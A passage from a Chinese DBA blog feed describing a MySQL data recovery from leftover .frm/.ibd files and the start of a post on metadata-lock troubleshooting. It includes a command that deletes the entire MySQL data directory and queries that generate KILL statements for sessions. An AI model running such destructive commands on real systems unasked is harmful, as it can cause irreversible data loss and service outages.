~/home/cy02/*.frm /alidata/mysql/data/cy/ -p</span><br><span class="line">[root@toberoot alidata]# ll /alidata/mysql/data/cy/sys_res*</span><br><span class="line">-rw-r--r-- 1 mysql mysql  9106 Aug 14  2017 /alidata/mysql/data/cy/sys_res.frm</span><br><span class="line">-rw-r----- 1 mysql mysql 98304 May 17 16:44 /alidata/mysql/data/cy/sys_res.ibd</span><br><span class="line"><span class="meta">#</span><span class="bash"> 配置文件</span></span><br><span class="line">[mysqld]</span><br><span class="line">innodb_force_recovery=6</span><br><span class="line">[root@toberoot alidata]# vim /etc/my.cnf</span><br><span class="line">[root@toberoot alidata]# service mysqld start</span><br><span class="line">Starting MySQL.                                            [  OK  ]</span><br><span class="line"><span class="meta">#</span><span class="bash"> 表结构成功获取</span></span><br><span class="line">[root@toberoot alidata]# mysql cy -e 'desc sys_res'</span><br><span class="line">+--------+--------------+------+-----+---------+-------+</span><br><span class="line">| Field  | Type         | Null | Key | Default | Extra |</span><br><span class="line">+--------+--------------+------+-----+---------+-------+</span><br><span class="line">| ID     | varchar(64)  | NO   | PRI | NULL    |       |</span><br><span class="line">| NAME   | varchar(32)  | NO   |     | NULL    |       |</span><br><span class="line">| CODE   | varchar(128) | NO   |     | NULL    |       |</span><br><span class="line">| URI    | varchar(128) | NO   |     | NULL    |       |</span><br><span class="line">| LOGO   | varchar(64)  | YES  |     | NULL    |       |</span><br><span class="line">| TYPE   | int(11)      | NO   |     | NULL    |       |</span><br><span class="line">| PCODE  | varchar(64)  | YES  |     | NULL    |       |</span><br><span class="line">| SORT   | int(11)      | YES  |     | 0       |       |</span><br><span class="line">| STATE  | int(11)      | NO   |     | NULL    |       |</span><br><span class="line">| ADMIN  | int(11)      | YES  |     | 0       |       |</span><br><span class="line">| REMARK | varchar(64)  | YES  |     | NULL    |       |</span><br><span class="line">| CRTIME | datetime     | NO   |     | NULL    |       |</span><br><span class="line">| UPTIME | datetime     | NO   |     | NULL    |       |</span><br><span class="line">+--------+--------------+------+-----+---------+-------+</span><br><span class="line">root@MySQL-01 16:49:  [(none)]&gt; select table_name,table_schema from information_schema.tables where table_schema='cy';</span><br><span class="line">+----------------------+--------------+</span><br><span class="line">| table_name           | table_schema |</span><br><span class="line">+----------------------+--------------+</span><br><span class="line">| base_dict            | cy           |</span><br><span class="line">| biz                  | cy           |</span><br><span class="line">| biz_advise           | cy           |</span><br><span class="line">| biz_bank             | cy           |</span><br><span class="line">| biz_gift             | cy           |</span><br><span class="line">| biz_gprs_bind        | cy           |</span><br><span class="line">| biz_gprs_bind_his    | cy           |</span><br><span class="line">| biz_msg_template     | cy           |</span><br><span class="line">| biz_take             | cy           |</span><br><span class="line">| biz_take_bank        | cy           |</span><br><span class="line">| biz_take_wwlt        | cy           |</span><br><span class="line">| biz_take_wx          | cy           |</span><br><span class="line">| biz_vip              | cy           |</span><br><span class="line">| biz_wlt              | cy           |</span><br><span class="line">| biz_wx               | cy           |</span><br><span class="line">| biz_wx_focus         | cy           |</span><br><span class="line">| biz_wx_walt          | cy           |</span><br><span class="line">| cfg_area             | cy           |</span><br><span class="line">| cfg_id_gen           | cy           |</span><br><span class="line">| gprs_model           | cy           |</span><br><span class="line">| mbr                  | cy           |</span><br><span class="line">| mbr_coin             | cy           |</span><br><span class="line">| mbr_coin_chged       | cy           |</span><br><span class="line">| mbr_oauth            | cy           |</span><br><span class="line">| mbr_pay              | cy           |</span><br><span class="line">| mbr_prizen           | cy           |</span><br><span class="line">| mbr_recharge         | cy           |</span><br><span class="line">| mbr_wallet           | cy           |</span><br><span class="line">| mbr_wallet_chged     | cy           |</span><br><span class="line">| ord                  | cy           |</span><br><span class="line">| ord_item             | cy           |</span><br><span class="line">| ord_pay_ali          | cy           |</span><br><span class="line">| ord_pay_coin         | cy           |</span><br><span class="line">| ord_pay_return       | cy           |</span><br><span class="line">| ord_pay_wlt          | cy           |</span><br><span class="line">| ord_pay_wx           | cy           |</span><br><span class="line">| prod                 | cy           |</span><br><span class="line">| prod_base_args       | cy           |</span><br><span class="line">| prod_bug_rpt         | cy           |</span><br><span class="line">| prod_cmd             | cy           |</span><br><span class="line">| prod_cmd_invoke      | cy           |</span><br><span class="line">| prod_coin_rpt        | cy           |</span><br><span class="line">| prod_coin_rpt_log    | cy           |</span><br><span class="line">| prod_gprs_bind       | cy           |</span><br><span class="line">| prod_gprs_bind_his   | cy           |</span><br><span class="line">| prod_instl_imgs      | cy           |</span><br><span class="line">| prod_instl_pos       | cy           |</span><br><span class="line">| prod_instl_pos_model | cy           |</span><br><span class="line">| prod_mod_attr        | cy           |</span><br><span class="line">| prod_mod_attr_val    | cy           |</span><br><span class="line">| prod_mod_sku         | cy           |</span><br><span class="line">| prod_model           | cy           |</span><br><span class="line">| prod_onl_log         | cy           |</span><br><span class="line">| prod_sp_arg_vals     | cy           |</span><br><span class="line">| prod_sp_args         | cy           |</span><br><span class="line">| sys_acct             | cy           |</span><br><span class="line">| sys_acct_res         | cy           |</span><br><span class="line">| sys_res              | cy           |</span><br><span class="line">+----------------------+--------------+</span><br><span class="line">58 rows in set (0.00 sec)</span><br><span class="line"><span class="meta">#</span><span class="bash"> 58张表dump备份出来</span></span><br><span class="line">[root@toberoot alidata]# mysqldump -B cy -d &gt; /alidata/new_yc_ddl.sql</span><br><span class="line">[root@toberoot alidata]# tail -n 30 /alidata/new_yc_ddl.sql </span><br><span class="line">/*!40101 SET @saved_cs_client     = @@character_set_client */;</span><br><span class="line">/*!40101 SET character_set_client = utf8 */;</span><br><span class="line">CREATE TABLE `sys_res` (</span><br><span class="line">  `ID` varchar(64) NOT NULL COMMENT 'ID',</span><br><span class="line">  `NAME` varchar(32) NOT NULL COMMENT '菜单名称',</span><br><span class="line">  `CODE` varchar(128) NOT NULL COMMENT '菜单编码',</span><br><span class="line">  `URI` varchar(128) NOT NULL COMMENT 'URI',</span><br><span class="line">  `LOGO` varchar(64) DEFAULT NULL COMMENT '图标',</span><br><span class="line">  `TYPE` int(11) NOT NULL COMMENT '@菜单类型（1菜单；2按钮）',</span><br><span class="line">  `PCODE` varchar(64) DEFAULT NULL COMMENT '父菜单',</span><br><span class="line">  `SORT` int(11) DEFAULT '0' COMMENT '排序',</span><br><span class="line">  `STATE` int(11) NOT NULL COMMENT '@@状态（0 无效；1 正常）',</span><br><span class="line">  `ADMIN` int(11) DEFAULT '0' COMMENT '是否管理员菜单（默认0否）',</span><br><span class="line">  `REMARK` varchar(64) DEFAULT NULL COMMENT '备注',</span><br><span class="line">  `CRTIME` datetime NOT NULL COMMENT 'CRTIME',</span><br><span class="line">  `UPTIME` datetime NOT NULL COMMENT 'UPTIME',</span><br><span class="line">  PRIMARY KEY (`ID`)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='权限_系统资源';</span><br><span class="line">/*!40101 SET character_set_client = @saved_cs_client */;</span><br><span class="line">/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;</span><br><span class="line"></span><br><span class="line">/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;</span><br><span class="line">/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;</span><br><span class="line">/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;</span><br><span class="line">/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;</span><br><span class="line">/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;</span><br><span class="line">/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;</span><br><span class="line">/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;</span><br><span class="line"></span><br><span class="line">-- Dump completed on 2018-05-17 16:52:28</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> discard和import命令</span></span><br><span class="line">def discard_table_test(table_file,sql_file):</span><br><span class="line">    a_file = open(sql_file,'w')</span><br><span class="line">    b_file = open(table_file)</span><br><span class="line">    b_list = b_file.readlines()</span><br><span class="line">    for table in b_list:</span><br><span class="line">        string = "alter table &#123;&#125; discard tablespace;".format(table)</span><br><span class="line">        a_file.write(string)</span><br><span class="line">    a_file.close() </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def import_table_test(table_file,sql_file):</span><br><span class="line">    a_file = open(sql_file,'w')</span><br><span class="line">    b_file = open(table_file)</span><br><span class="line">    b_list = b_file.readlines()</span><br><span class="line">    for table in b_list:</span><br><span class="line">        string = "alter table &#123;&#125; import tablespace;".format(table)</span><br><span class="line">        a_file.write(string)</span><br><span class="line">    a_file.close() </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">discard_table_test('/alidata/cy_table.txt','/alidata/cy_sql5.sql')</span><br><span class="line">import_table_test('/alidata/cy_table.txt','/alidata/cy_sql6.sql')</span><br><span class="line">   </span><br><span class="line"><span class="meta">#</span><span class="bash"> 生成sql</span></span><br><span class="line">[root@toberoot alidata]# python py_createtable01.py </span><br><span class="line">[root@toberoot alidata]# ll</span><br><span class="line">total 124</span><br><span class="line">-rw-r--r--  1 root  root  16729 May 17 16:00 cy_error1.log</span><br><span class="line">-rw-r--r--  1 root  root   2033 May 17 15:12 cy_sql1.sql</span><br><span class="line">-rw-r--r--  1 root  root   1047 May 17 15:56 cy_sql2.sql</span><br><span class="line">-rw-r--r--  1 root  root   6353 May 17 16:15 cy_sql3.sql</span><br><span class="line">-rw-r--r--  1 root  root   1395 May 17 16:17 cy_sql4.sql</span><br><span class="line">-rw-r--r--  1 root  root   2033 May 17 16:55 cy_sql5.sql</span><br><span class="line">-rw-r--r--  1 root  root   2033 May 17 16:55 cy_sql6.sql</span><br><span class="line">-rw-r--r--  1 root  root    837 May 17 16:03 cy_table_col.txt</span><br><span class="line">-rw-r--r--  1 root  root    699 May 17 15:56 cy_table.txt</span><br><span class="line">drwxr-xr-x  3 root  root   4096 May 17 16:41 install</span><br><span class="line">drwxr-xr-x 11 mysql mysql  4096 May 17 16:47 mysql</span><br><span class="line">-rw-r--r--  1 root  root  57068 May 17 16:52 new_yc_ddl.sql</span><br><span class="line">-rw-r--r--  1 root  root   2489 May 17 16:55 py_createtable01.py</span><br><span class="line"></span><br><span class="line">[root@toberoot alidata]# head /alidata/cy_sql5.sql </span><br><span class="line">alter table base_dict</span><br><span class="line"> discard tablespace;alter table biz_advise</span><br><span class="line"> discard tablespace;alter table biz_bank</span><br><span class="line"> discard tablespace;alter table biz</span><br><span class="line"> discard tablespace;alter table biz_gift</span><br><span class="line"> discard tablespace;alter table biz_gprs_bind</span><br><span class="line"> discard tablespace;alter table biz_gprs_bind_his</span><br><span class="line"> discard tablespace;alter table biz_msg_template</span><br><span class="line"> discard tablespace;alter table biz_take_bank</span><br><span class="line"> discard tablespace;alter table biz_take</span><br><span class="line">[root@toberoot alidata]# head /alidata/cy_sql6.sql </span><br><span class="line">alter table base_dict</span><br><span class="line"> import tablespace;alter table biz_advise</span><br><span class="line"> import tablespace;alter table biz_bank</span><br><span class="line"> import tablespace;alter table biz</span><br><span class="line"> import tablespace;alter table biz_gift</span><br><span class="line"> import tablespace;alter table biz_gprs_bind</span><br><span class="line"> import tablespace;alter table biz_gprs_bind_his</span><br><span class="line"> import tablespace;alter table biz_msg_template</span><br><span class="line"> import tablespace;alter table biz_take_bank</span><br><span class="line"> import tablespace;alter table biz_take</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@toberoot alidata]# mysql cy &lt; cy_sql5.sql</span><br><span class="line">ERROR 1036 (HY000) at line 1: Table 'base_dict' is read only</span><br><span class="line">[root@toberoot alidata]# vim /etc/my.cnf</span><br><span class="line">[root@toberoot alidata]# service mysqld restart</span><br><span class="line">Shutting down MySQL..                                      [  OK  ]</span><br><span class="line">Starting MySQL.                                            [  OK  ]</span><br><span class="line">[root@toberoot alidata]# vim /etc/my.cnf</span><br><span class="line">[root@toberoot alidata]# mysql cy &lt; cy_sql5.sql</span><br><span class="line"></span><br><span class="line">[root@toberoot alidata]# cp /root/home/cy02/*.ibd /alidata/mysql/data/cy/ -rp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@toberoot alidata]# mysql cy &lt; cy_sql6.sql</span><br><span class="line">ERROR 2013 (HY000) at line 1: Lost connection to MySQL server during query</span><br><span class="line">[root@toberoot alidata]# vim /etc/my.cnf</span><br><span class="line">[root@toberoot alidata]# service mysqld restart</span><br><span class="line">Shutting down MySQL..                                      [  OK  ]</span><br><span class="line">Starting MySQL.                                            [  OK  ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@toberoot alidata]# mysql cy &lt; cy_sql6.sql</span><br><span class="line">ERROR 1036 (HY000) at line 1: Table 'base_dict' is read only</span><br><span class="line">[root@toberoot alidata]# service mysqld stop</span><br><span class="line">Shutting down MySQL..                                      [  OK  ]</span><br><span class="line">[root@toberoot alidata]# rm -rf /alidata/mysql/data/*</span><br><span class="line"></span><br><span class="line">[root@toberoot alidata]# service mysqld start</span><br><span class="line">Starting MySQL.                                            [  OK  ]</span><br><span class="line">[root@toberoot alidata]# mysql &lt; new_yc_ddl.sql </span><br><span class="line">[root@toberoot alidata]# mysql -e 'use cy;select * from sys_res'</span><br><span class="line"></span><br><span class="line">开启强制恢复参数</span><br><span class="line">[root@toberoot alidata]# vim /etc/my.cnf</span><br><span class="line">[root@toberoot alidata]# mysql cy &lt; cy_sql</span><br><span class="line">cy_sql1.sql  cy_sql2.sql  cy_sql3.sql  cy_sql4.sql  cy_sql5.sql  cy_sql6.sql  </span><br><span class="line">[root@toberoot alidata]# mysql cy &lt; cy_sql5.sql </span><br><span class="line">[root@toberoot alidata]# cp /root/home/cy02/*.ibd /alidata/mysql/data/cy/ -rp</span><br><span class="line">[root@toberoot alidata]# mysql cy &lt; cy_sql6.sql</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 全备份数据</span></span><br><span class="line">[root@toberoot alidata]# mysqldump -B cy &gt; new_cy_all.sql</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看备份的数据量</span></span><br><span class="line">-rw-r--r--  1 root  root   26M May 17 17:13 new_cy_all.sql</span><br></pre></td></tr></table></figure>

<h2 id="报错汇总"><a href="#报错汇总" class="headerlink" title="报错汇总"></a>报错汇总</h2><h3 id="ERROR-1036-（HY00）"><a href="#ERROR-1036-（HY00）" class="headerlink" title="ERROR 1036 （HY00）"></a>ERROR 1036 （HY00）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@toberoot alidata]# mysql cy &lt; cy_sql5.sql</span><br><span class="line">ERROR 1036 (HY000) at line 1: Table 'base_dict' is read only</span><br></pre></td></tr></table></figure>

<p>解决方法：</p>
<ol>
<li>检查是否配置文件中存在innodb_force_recovery参数</li>
<li>如果存在去除或注释掉，重启服务即可</li>
<li>还不行就清空数据库导入结构后再继续</li>
</ol>
<h3 id="ERROR-2013-HY000"><a href="#ERROR-2013-HY000" class="headerlink" title="ERROR 2013 (HY000)"></a>ERROR 2013 (HY000)</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@toberoot alidata]# mysql cy &lt; cy_sql6.sql</span><br><span class="line">ERROR 2013 (HY000) at line 1: Lost connection to MySQL server during query</span><br></pre></td></tr></table></figure>

<p>解决方法：</p>
<ol>
<li><p>sql脚本中执行import tablespace的操作需要开启recovery的参数</p>
</li>
<li><p>重启服务 </p>
<p>在客户服务上，执行以上操作还是报错无法连接，尝试多次都不行。</p>
</li>
</ol>
<p><img src="MySQL%E4%B8%80%E6%AC%A1%E6%83%8A%E5%BF%83%E5%8A%A8%E9%AD%84%E5%9C%B0%E6%95%B0%E6%8D%AE%E5%BC%BA%E5%88%B6%E6%81%A2%E5%A4%8D/04.jpg" alt=""></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次case的教训就是，备份！一定要有周期性的有效备份！</p>
<p>欺骗MySQL进程蒙混过关只能是没办法的办法，而且不能保证成功率。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> -*- coding : utf8 -*-</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> py_createtable01.py</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> auth： booboowei</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class mysql_tools():</span><br><span class="line">    def __init__(self, in_file):</span><br><span class="line">        self.b_list = open(in_file).readlines()</span><br><span class="line"></span><br><span class="line">       </span><br><span class="line">    def create_table_test(self, sql_file):</span><br><span class="line">        a_file = open(sql_file, 'w')</span><br><span class="line">        for table in self.b_list:</span><br><span class="line">            string = "create table &#123;&#125; (id int);".format(table)</span><br><span class="line">            a_file.write(string)</span><br><span class="line">        a_file.close()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    def desc_table_test(self, sql_file):</span><br><span class="line">        a_file = open(sql_file, 'w')</span><br><span class="line">        for table in self.b_list:</span><br><span class="line">            string = "desc &#123;&#125;;".format(table)</span><br><span class="line">            a_file.write(string)</span><br><span class="line">        a_file.close()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    def create_table_col(self, sql_file):</span><br><span class="line">        a_file = open(sql_file, 'w')</span><br><span class="line">        str_list = []</span><br><span class="line">        for table_col_str in self.b_list:</span><br><span class="line">            table_col_list = table_col_str.split()</span><br><span class="line">            table = table_col_list[0]</span><br><span class="line">            col = int(table_col_list[1])</span><br><span class="line">            string = "create table &#123;&#125; (".format(table)</span><br><span class="line">            str_list.append(string)</span><br><span class="line">            for i in range(1, col + 1):</span><br><span class="line">                if i != col:</span><br><span class="line">                    string = 'id&#123;&#125; int,'.format(i)</span><br><span class="line">                else:</span><br><span class="line">                    string = 'id&#123;&#125; int);'.format(i)</span><br><span class="line">                str_list.append(string)</span><br><span class="line">        for line in str_list:</span><br><span class="line">            a_file.write(line)</span><br><span class="line">        a_file.close()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    def drop_table_test(self,  sql_file):</span><br><span class="line">        a_file = open(sql_file, 'w')</span><br><span class="line">        for table in self.b_list:</span><br><span class="line">            string = "drop table &#123;&#125;;".format(table)</span><br><span class="line">            a_file.write(string)</span><br><span class="line">        a_file.close()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    def discard_table_test(self, sql_file):</span><br><span class="line">        a_file = open(sql_file, 'w')</span><br><span class="line">        for table in self.b_list:</span><br><span class="line">            string = "alter table &#123;&#125; discard tablespace;".format(table)</span><br><span class="line">            a_file.write(string)</span><br><span class="line">        a_file.close()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    def import_table_test(self, sql_file):</span><br><span class="line">        a_file = open(sql_file, 'w')</span><br><span class="line">        for table in self.b_list:</span><br><span class="line">            string = "alter table &#123;&#125; import tablespace;".format(table)</span><br><span class="line">            a_file.write(string)</span><br><span class="line">        a_file.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == '__main__':</span><br><span class="line">    mysql_tools('/alidata/cy_table.txt').create_table_test('/alidata/cy_sql1.sql')</span><br><span class="line">    mysql_tools('/alidata/cy_table.txt').desc_table_test('/alidata/cy_sql2.sql')</span><br><span class="line">    # 根据以上表名和列数生成新的测试表</span><br><span class="line">    mysql_tools('/alidata/cy_table_col.txt').create_table_col('/alidata/cy_sql3.sql')</span><br><span class="line">    mysql_tools('/alidata/cy_table.txt').drop_table_test('/alidata/cy_sql4.sql')</span><br><span class="line">    mysql_tools('/alidata/cy_table.txt').discard_table_test('/alidata/cy_sql5.sql')</span><br><span class="line">    mysql_tools('/alidata/cy_table.txt').import_table_test('/alidata/cy_sql6.sql')</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>技术广角</category>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>数据救援</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL的元锁MDL发生场景和解决方法总结</title>
    <url>/2017/08/19/booboo_others/MySQL%E7%9A%84%E5%85%83%E9%94%81MDL%E5%8F%91%E7%94%9F%E5%9C%BA%E6%99%AF%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>摘要：MetaData Lock即元数据锁，在数据库中元数据即数据字典信息包括db,table,function,procedure,trigger,event等。metadata lock主要为了保证元数据的一致性,用于处理不同线程操作同一数据对象的同步与互斥问题。</p>
<p>今天有客户(MySQL 5.6)遇到该问题，最关键的是属于第三种情况，google上根本找不到类似的故障案例，唯一一个非常接近的故障案例中数据库版本却不同（具体看下文慢慢聊），哎，困难重重啊，最终还是解决了哈。</p>
<p>alter table的语句是很危险的，在操作之前最好确认对要操作的表没有任何进行中的操作、没有未提交事务、也没有显式事务中的报错语句。如果有alter table的维护任务，在无人监管的时候运行，最好通过lock_wait_timeout设置好超时时间，避免长时间的metedata锁等待。</p>
<a id="more"></a>


<h2 id="什么是metadata-lock？"><a href="#什么是metadata-lock？" class="headerlink" title="什么是metadata lock？"></a>什么是metadata lock？</h2><p>MetaData Lock即元数据锁，在数据库中元数据即数据字典信息包括db,table,function,procedure,trigger,event等。metadata lock主要为了保证元数据的一致性,用于处理不同线程操作同一数据对象的同步与互斥问题。</p>
<h3 id="MetaData-Lock的前世今生"><a href="#MetaData-Lock的前世今生" class="headerlink" title="MetaData Lock的前世今生"></a><strong>MetaData Lock的前世今生</strong></h3><p>MDL锁是为了解决一个有名的<a href="https://bugs.mysql.com/bug.php?id=989" target="_blank" rel="noopener">bug#989</a>，所以在5.5.3版本引入了MDL锁。其实5.5也有类似保护元数据的机制，只是没有明确提出MDL概念而已。但是5.5之前版本(比如5.1)与5.5之后版本在保护元数据这块有一个显著的不同点是，5.1对于元数据的保护是语句级别的，5.5对于metadata的保护是事务级别的。所谓语句级别，即语句执行完成后，无论事务是否提交或回滚，其表结构可以被其他会话更新；而事务级别则是在事务结束后才释放MDL。引入MDL锁主要是为了<strong>解决两个问题</strong>：</p>
<ul>
<li>事务隔离问题：比如在可重复隔离级别下，会话A在2次查询期间，会话B对表结构做了修改，两次查询结果就会不一致，无法满足可重复读的要求。</li>
<li>数据复制问题：比如会话A执行了多条更新语句期间，另外一个会话B做了表结构变更并且先提交，就会导致slave在重做时，先重做alter，再重做update时就会出现复制错误的现象。也就是上面提到的<a href="https://bugs.mysql.com/bug.php?id=989" target="_blank" rel="noopener">bug#989</a>。</li>
</ul>
<hr>
<h3 id="DDL操作与MetaData-Lock"><a href="#DDL操作与MetaData-Lock" class="headerlink" title="DDL操作与MetaData Lock"></a>DDL操作与MetaData Lock</h3><ul>
<li>metadata lock 机制是为了保证数据一致性存在的，在有事务的操作时候，需要首先获得metadata lock ,然后操作，如果这个时候，又来了一个事务也要ddl操作同一个表，就会出现 metadata lock。</li>
<li>自动提交模式下，单语句就是一个事务，执行完了，事务也就结束了。</li>
<li>preparestatement  会获得 metalock，一旦prepare 完毕， metalock 就释放了。</li>
<li>online DDL应该是指在alter table进行的时候， 插入/修改/删除数据的sql语句不会Waiting for table metadata lock。一旦alter table TableA的操作停滞在Waiting for table metadata lock的状态，后续对TableA的任何操作（包括读）都无法进行，也会在Opening tables的阶段进入Waiting for table metadata lock的队列。</li>
</ul>
<h2 id="Alter-table-会发生锁的三种场景"><a href="#Alter-table-会发生锁的三种场景" class="headerlink" title="Alter table 会发生锁的三种场景"></a>Alter table 会发生锁的三种场景</h2><h3 id="场景1"><a href="#场景1" class="headerlink" title="场景1"></a>场景1</h3><ul>
<li>会话A对booboo表执行读操作<code>select *,sleep(60) from booboo;</code>，正在进行未提交事务</li>
<li>会话B对booboo表执行在线DDL操作<code>alter table booboo add q4 int default 0;</code></li>
<li>会话C对booboo表执行隐式读操作<code>select *,sleep(60) from booboo;</code>,进行等待</li>
<li>会话D对booboo表执行显示读操作<code>begin;select * from booboo;</code>也会进行等待</li>
<li>通过<code>show processlist</code>可以看到会话A（对booboo表上正在进行的操作），此时会话B（alter table语句）无法获取到metadata 独占锁，会进行等待，会话C和会话D都会进行等待，且能从processlist表中看到对booboo表的操作</li>
<li>会话A提交事务后或kill之后，会话C事务结束，会话D<code>select</code>语句执行成功，事务提交则会话B可执行，否则进入场景2</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> show processlist;</span></span><br><span class="line">+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+</span><br><span class="line">| Id | User | Host      | db        | Command | Time | State                           | Info                                    |</span><br><span class="line">+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+</span><br><span class="line">|  6 | root | localhost | uplooking | Query   |  167 | Waiting for table metadata lock | alter table booboo add q4 int default 0 |</span><br><span class="line">|  7 | root | localhost | uplooking | Query   |  155 | Waiting for table metadata lock | select * from booboo                    |</span><br><span class="line">|  8 | root | localhost | uplooking | Query   |    0 | starting                        | show processlist                        |</span><br><span class="line">|  9 | root | localhost | uplooking | Query   |  181 | User sleep                      | select *,sleep(60) from booboo          |</span><br><span class="line">| 10 | root | localhost | uplooking | Query   |    7 | Waiting for table metadata lock | select * from booboo                    |</span><br><span class="line">+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br><span class="line"><span class="meta">#</span><span class="bash"> id=9的线程为会话A 虽然是隐式事务，但是没有执行成功，所以为未提交的事务</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> id=6的线程为会话B 在会话A有事务未提交的情况下，执行Alter操作,争抢metadata lock</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> id=7的线程为会话C 隐式查询事务也会进入等待</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> id=10的线程为会话D 显示查询事务同样进入等待</span></span><br></pre></td></tr></table></figure>

<p>解决方法</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 查看metadatalock</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 第一种情况，则定位到长时间未提交的事务kill即可</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查询 information_schema.innodb_trx 看到有长时间未完成的事务， 使用 <span class="built_in">kill</span> 命令终止该查询。</span></span><br><span class="line"></span><br><span class="line">select concat('kill ',i.trx_mysql_thread_id,';') from information_schema.innodb_trx i,</span><br><span class="line">  (select </span><br><span class="line">         id, time</span><br><span class="line">     from</span><br><span class="line">         information_schema.processlist</span><br><span class="line">     where</span><br><span class="line">         time = (select </span><br><span class="line">                 max(time)</span><br><span class="line">             from</span><br><span class="line">                 information_schema.processlist</span><br><span class="line">             where</span><br><span class="line">                 state = 'Waiting for table metadata lock'</span><br><span class="line">                     and substring(info, 1, 5) in ('alter' , 'optim', 'repai', 'lock ', 'drop ', 'creat'))) p</span><br><span class="line">  where timestampdiff(second, i.trx_started, now()) &gt; p.time</span><br><span class="line">  and i.trx_mysql_thread_id  not in (connection_id(),p.id);</span><br></pre></td></tr></table></figure>



<h3 id="场景2"><a href="#场景2" class="headerlink" title="场景2"></a>场景2</h3><ul>
<li>通过<code>show processlist</code>看不到booboo上有任何操作，但实际上存在有未提交的事务，可以在<code>information_schema.innodb_trx</code>中查看到。在事务没有完成之前，booboo的锁不会释放，alter table同样获取不到metadata的独占锁</li>
<li>会话D提交事务或回滚或kill，则会话B中的Alter可继续执行</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 在场景1的基础上，将会话A的事务完成或者<span class="built_in">kill</span>掉，会话C执行成功，但是会话B和会话D继续进入metadata锁的等待。原因是会话D虽然select可以执行，但是事务没有提交，则表上的metadata锁还存在，导致会话B的ddl操作无法执行。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 会话B和会话D，情况1：知道有未完成的事务D，则结束会话D的事务，会话B正常执行。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 会话B和会话D，情况2：不知道有未结束的事务D，如何排错呢？</span></span><br><span class="line">=================================</span><br><span class="line"></span><br><span class="line">-- 请根据具体的情景修改查询语句</span><br><span class="line">-- 如果导致阻塞的语句的用户与当前用户不同，请使用导致阻塞的语句的用户登录来终止会话</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 场景2的情况，是在场景1的基础上，还是有metadatalock锁（*一般生产环境不会停服务，因此不停的有新的query发送过来，就会出现场景2*），则手动继续kill掉长事务即可，注意生产环境中，有可能ddl操作需要保留（*例如MDL锁出现在主从同步的从中，从库需要去执行主发送的表变更，当然，也可以先将主从停掉，手动执行alter操作，都可以*）以下方法是在停止对从库的读操作后，将非ddl的连接kill掉</span></span></span><br><span class="line"></span><br><span class="line">select id,State,command from information_schema.processlist where State="Waiting for table metadata lock";</span><br><span class="line">select  timediff(sysdate(),trx_started) timediff,sysdate(),trx_started,id,USER,DB,COMMAND,STATE,trx_state,trx_query from information_schema.processlist,information_schema.innodb_trx  where trx_mysql_thread_id=id;</span><br><span class="line">show processlist;</span><br><span class="line">select  concat('kill ',trx_mysql_thread_id,';') from information_schema.processlist,information_schema.innodb_trx  where trx_mysql_thread_id=id and State!="Waiting for table metadata lock";</span><br><span class="line"></span><br><span class="line">===============================</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> show processlist;                                                                                                             </span></span><br><span class="line">+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+</span><br><span class="line">| Id | User | Host      | db        | Command | Time | State                           | Info                                    |</span><br><span class="line">+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+</span><br><span class="line">|  6 | root | localhost | 